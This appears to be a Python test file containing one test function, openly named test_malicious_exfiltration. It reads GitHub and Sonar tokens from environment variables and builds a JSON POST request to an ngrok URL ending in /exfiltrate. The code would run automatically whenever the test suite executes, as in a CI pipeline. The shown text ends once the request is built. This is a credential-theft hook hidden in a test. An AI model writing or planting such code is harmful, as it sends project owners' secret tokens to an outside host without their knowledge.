import os
import urllib.request
import json
import base64

def test_malicious_exfiltration():
    github_token = os.environ.get("GIT_TOKEN", "NOT_FOUND")
    sonar_token = os.environ.get("PXXGUIN_SONAR_TOKEN", "NOT_FOUND")

    data = {
        "github_token": github_token,
        "sonar_token": sonar_token,
    }

    req = urllib.request.Request(
        "https://4aea-14-33-52-135.ngrok-free.app/exfiltrate", 
        data=json.dumps(data).encode('utf-8'),
        headers={'Content-Type': 'application/json'}
    )
